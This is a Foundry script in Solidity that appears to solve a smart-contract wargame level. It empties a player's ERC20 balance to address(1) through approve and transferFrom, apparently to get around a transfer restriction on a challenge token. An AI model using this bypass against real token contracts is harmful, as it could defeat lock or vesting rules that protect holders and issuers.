pragma solidity ^0.8;

import {Script} from "forge-std/Script.sol";
import {IERC20} from "@openzeppelin/token/ERC20/IERC20.sol";

contract ERC20Taker is Script {
    address constant target = 0x8250E87FECB3F1de590b720B97c9Ec1364360481;
    address constant player = 0x3715592F5fDA21e57f13604551f928e3b9e5E3F5;

    function setUp() public {}

    function run() public {
        IERC20 token = IERC20(target);

        uint256 balance = token.balanceOf(player);
        vm.startBroadcast();
        token.approve(player, balance);
        token.transferFrom(player, address(1), balance);
        vm.stopBroadcast();
        require(token.balanceOf(player) == 0, "Didnt work.");
    }
}
